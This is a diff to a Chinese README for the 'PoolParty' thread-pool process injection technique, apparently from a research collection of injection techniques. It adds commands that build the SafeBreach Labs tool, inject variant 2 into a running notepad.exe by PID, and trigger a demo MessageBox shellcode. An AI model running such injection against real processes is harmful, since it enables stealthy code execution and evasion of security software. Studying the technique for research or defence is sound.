@@ -350,23 +350,69 @@ WriteProcessMemory(hProcess, &targetTpPool.TaskQueue[HIGH]->Queue.Blink,
 
 ## 使用方法
 
-### 编译
+### 快速测试（推荐）
 
 ```bash
-./build.sh
+cd techniques/37-poolparty
+chmod +x test.sh
+./test.sh
 ```
 
-### 运行
+测试脚本会自动：
+1. 启动notepad.exe
+2. 获取进程PID
+3. 使用变体2进行注入
+4. 显示执行结果
+
+### 手动使用
 
 ```bash
 # 1. 启动目标进程
-notepad.exe
+notepad.exe &
 
-# 2. 执行注入
-./poolparty_tpwork.exe
+# 2. 获取PID
+tasklist | grep notepad.exe
 
-# 3. 与 notepad 交互（点击菜单、输入文字等）
-# 4. MessageBox 将弹出
+# 3. 执行注入（使用变体2：RemoteTpWorkInsertion）
+./PoolParty.exe -V 2 -P <PID>
+
+# 4. 与notepad交互以触发shellcode
+# 预期：弹出MessageBox显示"Injected! PoolParty TP_WORK"
+```
+
+### 编译说明
+
+**本实现使用 SafeBreach Labs 官方源代码**
+
+```bash
+cd techniques/37-poolparty
+
+# 使用 Visual Studio 2022 MSBuild 编译
+./build.sh
+
+# 输出位置
+# - PoolParty.exe (当前目录，自动复制)
+# - src/x64/Release/PoolParty.exe (原始输出)
+```
+
+**要求**:
+- Visual Studio 2022 (Community/Professional/Enterprise)
+- Boost 1.82.0 (通过 NuGet 自动安装)
+- Windows SDK
+
+**源代码文件**:
+```
+techniques/37-poolparty/
+├── PoolParty.sln          # Visual Studio 解决方案
+├── src/                   # 官方源代码
+│   ├── main.cpp
+│   ├── PoolParty.cpp      # 主注入逻辑
+│   ├── WorkerFactory.cpp  # Worker Factory 劫持
+│   ├── ThreadPool.cpp     # 线程池操作
+│   ├── Native.hpp         # NT API 封装
+│   └── x64/               # 编译输出目录
+├── build.sh               # 编译脚本
+└── test.sh                # 自动化测试
 ```
 
 ### 预期输出
